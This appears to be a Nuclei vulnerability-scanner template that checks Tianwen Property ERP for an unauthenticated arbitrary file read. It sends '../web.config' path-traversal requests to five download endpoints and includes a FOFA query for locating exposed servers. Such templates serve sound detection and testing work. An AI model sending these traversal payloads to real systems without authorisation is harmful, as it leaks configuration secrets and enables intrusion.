http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <configuration>
    - <system.web>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config'
  - '{{BaseURL}}/HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config'
  - '{{BaseURL}}/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config'
  - '{{BaseURL}}/HM/M_Main/InformationManage/PlanDownLoad.aspx?PlanFile=../web.config'
  - '{{BaseURL}}/HM/M_Main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config'
  stop-at-first-match: true
id: tianwen-erp-lfi
info:
  author: Co5mos
  description: "\u5929\u95EE\u7269\u4E1AERP\u7CFB\u7EDF\u7684 `ContractDownLoad.aspx`,\
    \ `OwnerVacantDownLoad.aspx`, `VacantDiscountDownLoad.aspx` \u63A5\u53E3\u5B58\
    \u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\
    \u4EFD\u9A8C\u8BC1\u7684\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u6B64\u6F0F\
    \u6D1E\u8BFB\u53D6\u7CFB\u7EDF\u5185\u90E8\u914D\u7F6E\u6587\u4EF6\uFF0C\u9020\
    \u6210\u4FE1\u606F\u6CC4\u9732\uFF0C\u5BFC\u81F4\u7CFB\u7EDF\u5904\u4E8E\u6781\
    \u4E0D\u5B89\u5168\u7684\u72B6\u6001\u3002\n"
  metadata:
    fofa-query: "body=\"\u5929\u95EE\u7269\u4E1AERP\u7CFB\u7EDF\" || body=\"\u56FD\
      \u5BB6\u7248\u6743\u5C40\u8F6F\u8457\u767B\u5B57\u7B2C1205328\u53F7\" || body=\"\
      /HM/M_Main/frame/sso.aspx\""
  name: Tianwen Property ERP Arbitrary File Read
  severity: critical
  tags: tianwen, lfi
